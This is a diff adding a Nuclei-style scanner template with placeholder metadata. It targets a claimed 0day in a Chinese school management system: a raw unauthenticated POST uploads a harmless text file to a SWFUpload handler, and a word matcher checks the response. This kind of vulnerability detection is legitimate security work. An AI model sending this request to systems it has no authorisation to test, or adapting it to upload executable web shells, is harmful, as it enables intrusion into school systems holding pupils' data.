@@ -1,0 +1,33 @@
+id: xzx-Upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 智慧中小学管理系统存在0day漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /Scripts/swfupload/Upload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.38(0x1800262b) NetType/WIFI Language/zh_CN qcloudcdn-xinan Request-Source=4 Request-Channel=99
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept: */*
+        Connection: close
+        Content-Length: 192
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="Filedata";filename="1222.txt"
+        Content-Type: image/png
+
+        whoisceshi
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.txt'
